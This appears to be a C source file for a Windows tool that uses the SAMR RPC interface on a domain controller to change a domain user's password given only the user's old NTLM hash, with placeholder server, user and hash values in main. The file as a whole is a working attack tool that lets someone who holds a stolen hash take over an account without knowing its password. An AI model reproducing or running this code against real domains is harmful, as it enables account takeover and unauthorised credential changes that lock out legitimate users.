#include <stdio.h>
#include <ntstatus.h>
#include "ms-samr.h"

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")

#define RtlEncryptLmOwfPwdWithLmOwfPwd		SystemFunction012
NTSTATUS WINAPI RtlEncryptLmOwfPwdWithLmOwfPwd(IN LPCBYTE DataLmOwfPassword, IN LPCBYTE KeyLmOwfPassword, OUT LPBYTE EncryptedLmOwfPassword);


#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define SAM_SERVER_CONNECT 0x00000001
#define SAM_SERVER_ENUMERATE_DOMAINS 0x00000010
#define SAM_SERVER_LOOKUP_DOMAIN 0x00000020
#define DOMAIN_LOOKUP 0x00000200

#define USER_CHANGE_PASSWORD 0x00000040

#define STATUS_WRONG_PASSWORD 0xC000006A
#define STATUS_PASSWORD_RESTRICTION 0xC000006C
#define STATUS_MORE_ENTRIES 0x00000105L

BOOL StringToHex(IN LPCWCHAR string, IN LPBYTE hex, IN DWORD size)
{
	DWORD i, j;
	BOOL result = (wcslen(string) == (size * 2));
	if (result)
	{
		for (i = 0; i < size; i++)
		{
			swscanf_s(&string[i * 2], L"%02x", &j);
			hex[i] = (BYTE)j;
		}
	}
	return result;
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}

handle_t __RPC_USER
PSAMPR_SERVER_NAME_bind(PSAMPR_SERVER_NAME pszSystemName)
{
	handle_t hBinding = NULL;
	LPWSTR pszStringBinding;
	RPC_STATUS status;

	wprintf("PSAMPR_SERVER_NAME_bind() called\n");

	status = RpcStringBindingComposeW(NULL,
		L"ncacn_np",
		pszSystemName,
		L"\\pipe\\samr",
		NULL,
		&pszStringBinding);
	if (status)
	{
		wprintf("RpcStringBindingCompose returned 0x%x\n", status);
		return NULL;
	}

	/* Set the binding handle that will be used to bind to the server. */
	status = RpcBindingFromStringBindingW(pszStringBinding,
		&hBinding);
	if (status)
	{
		wprintf("RpcBindingFromStringBinding returned 0x%x\n", status);
	}

	status = RpcStringFreeW(&pszStringBinding);
	if (status)
	{
		//        wprintf("RpcStringFree returned 0x%x\n", status);
	}

	return hBinding;
}


void __RPC_USER
PSAMPR_SERVER_NAME_unbind(PSAMPR_SERVER_NAME pszSystemName,
	handle_t hBinding)
{
	RPC_STATUS status;

	wprintf("PSAMPR_SERVER_NAME_unbind() called\n");

	status = RpcBindingFree(&hBinding);
	if (status)
	{
		wprintf("RpcBindingFree returned 0x%x\n", status);
	}
}


NTSTATUS ChangeNTLM(PSAMPR_SERVER_NAME uServerName, RPC_UNICODE_STRING* uUserName, unsigned char* oldNT, unsigned char* newNT)
{
	int i;
	NTSTATUS status = STATUS_DATA_ERROR;

	SAMPR_HANDLE hServer, hDomain, hUser;
	PRPC_SID domainSID = 0;
	long enumDomainStatus, changePassStatus;
	unsigned long RID = 0;
	unsigned long outVersion;
	unsigned long domainEnumerationContext = 0;
	unsigned long domainCountReturned;
	PSAMPR_ENUMERATION_BUFFER pEnumDomainBuffer = NULL;
	SAMPR_ULONG_ARRAY ridBuffer = { 0, NULL };
	SAMPR_ULONG_ARRAY useBuffer = { 0, NULL };

	SAMPR_REVISION_INFO inRevisionInfo, outRevisionInfo;
	inRevisionInfo.V1.Revision = 3;
	inRevisionInfo.V1.SupportedFeatures = 0;

	ENCRYPTED_NT_OWF_PASSWORD OldNtEncryptedWithNewNt;
	ENCRYPTED_NT_OWF_PASSWORD NewNtEncryptedWithOldNt;
	ENCRYPTED_LM_OWF_PASSWORD NewLMEncryptedWithNewNT;

	// init a Samr connect handle
	status = SamrConnect5(uServerName, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, 1, &inRevisionInfo, &outVersion, &outRevisionInfo, &hServer);
	if (!NT_SUCCESS(status) && hServer != NULL)
	{
		wprintf(L"[!] SamrConnect Error: %08X\n", status);
		exit(1);
	}
	else
		wprintf(L"[*] SamrConnect to Server.\n");

	do
	{
		// get domain name buffer
		enumDomainStatus = SamrEnumerateDomainsInSamServer(hServer, &domainEnumerationContext, &pEnumDomainBuffer, 100, &domainCountReturned);
		if (!NT_SUCCESS(enumDomainStatus) && enumDomainStatus != STATUS_MORE_ENTRIES)
		{
			wprintf(L"[!] SamrEnumerateDomainsInSamServer Error: %08X\n", status);
			exit(1);
		}
		else
			wprintf(L"[*] SamrEnumerateDomainsInSamServer success, Domain count: %ld\n", domainCountReturned);

		const wchar_t* sBuiltin = L"Builtin";
		for (i = 0; i < domainCountReturned; i++)
		{
			if (wcscmp(sBuiltin, pEnumDomainBuffer->Buffer[i].Name.Buffer) == 0)
				continue;

			// get domain SID
			status = SamrLookupDomainInSamServer(hServer, &pEnumDomainBuffer->Buffer[i].Name, &domainSID);
			if (!NT_SUCCESS(status))
			{
				wprintf(L"[!] SamrLookupDomainInSamServer Error: %08X\n", status);
				exit(1);
			}

			else
				wprintf(L"[*] SamrLookupDomainInSamServer success.\n");

			// get domain handle
			status = SamrOpenDomain(hServer, DOMAIN_LOOKUP, domainSID, &hDomain);
			if (!NT_SUCCESS(status))
			{
				wprintf(L"[!] SamrOpenDomain Error: %08X\n", status);
				exit(1);
			}
			else
				wprintf(L"[*] SamrOpenDomain success.\n");

			// get user's RID
			status = SamrLookupNamesInDomain(hDomain, 1, &uUserName[0], &ridBuffer, &useBuffer);
			if (!NT_SUCCESS(status))
			{
				wprintf(L"[!] SamrLookupNamesInDomain Error: %08X\n", status);
				exit(1);
			}
			else
			{
				RID = ridBuffer.Element[0];
				wprintf(L"[*] SamrLookupNamesInDomain success. User RID: %d\n", RID);
			}


			// get user handle
			status = SamrOpenUser(hDomain, USER_CHANGE_PASSWORD, RID, &hUser);
			if (!NT_SUCCESS(status))
			{
				wprintf(L"[!] SamrOpenUser Error: %08X\n", status);
				exit(1);
			}
			else
			{
				wprintf(L"[*] SamrOpenUser success.\n");
			}


			// https://doxygen.reactos.org/d2/de6/samlib_8c_source.html
			// Notice: we use emtpy-password's LM hash as new LM to be encrypted by new NT
			unsigned char newLM[16];
			PCWCHAR newLMHash = "AAD3B435B51404EEAAD3B435B51404EE";
			StringToHex(newLMHash, newLM, sizeof(newLM));
			status = RtlEncryptLmOwfPwdWithLmOwfPwd(newLM, newNT, &NewLMEncryptedWithNewNT);
			if (!NT_SUCCESS(status))
			{
				wprintf(L"[!] Calc NewLMEncryptedWithNewNT Error: %08X\n", status);
				exit(1);
			}

			// Encrypt the old NT hash with the new NT hash
			status = RtlEncryptLmOwfPwdWithLmOwfPwd(oldNT, newNT, &OldNtEncryptedWithNewNt);
			if (!NT_SUCCESS(status))
			{
				wprintf(L"[!] Calc OldNtEncryptedWithNewNt Error: %08X\n", status);
				exit(1);
			}

			// Encrypt the new NT hash with the old NT hash
			status = RtlEncryptLmOwfPwdWithLmOwfPwd(newNT, oldNT, &NewNtEncryptedWithOldNt);
			if (!NT_SUCCESS(status))
			{
				wprintf(L"[!] Calc NewNtEncryptedWithOldNt Error: %08X\n", status);
				exit(1);
			}

			/*
			* If you don't specify LMCross and NewLMEncryptedWithNewNT you will get an error code: 0xC000017F
			* 
			* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476
			*/
			status = SamrChangePasswordUser(hUser, FALSE, NULL, NULL, TRUE, &OldNtEncryptedWithNewNt, &NewNtEncryptedWithOldNt, FALSE, NULL, TRUE, &NewLMEncryptedWithNewNT);

			if (NT_SUCCESS(status))
			{
				wprintf(L"[*] Change password success! :)\n");
			}
			else if (status == STATUS_WRONG_PASSWORD)
			{
				wprintf(L"[!] Wrong Password!\n");
			}
			else if (status == STATUS_PASSWORD_RESTRICTION)
			{
				wprintf(L"[!] Restriction!\n");
			}
			else
			{
				wprintf(L"[!] Error Code: %08X\n", status);
			}

		}
	} while (enumDomainStatus == STATUS_MORE_ENTRIES);

}

int main()
{
	/*
	*  Information you must change:
	*    1. Your Domain's Netbios
	*    2. Username to change password
	*    3. Old NTLM Hash
	*    4. New NTLM Hash
	*/
	PSAMPR_SERVER_NAME serverName = L"TESTDC1";
	wchar_t username[] = L"test2";
	unsigned char oldNT[16];
	unsigned char newNT[16];

	PCWCHAR oldNTLM = L"94b0b46dfce6a8f3543c600cd2b6fd84";
	PCWCHAR newNTLM = L"94b0b46dfce6a8f3543c600cd2b6fd85";
	StringToHex(oldNTLM, oldNT, sizeof(oldNT));
	StringToHex(newNTLM, newNT, sizeof(newNT));

	unsigned short usernameLen = sizeof(username) - 2;
	RPC_UNICODE_STRING userName[] = { usernameLen, 30, username };

	ChangeNTLM(serverName, &userName, oldNT, newNT);

	return 0;
}
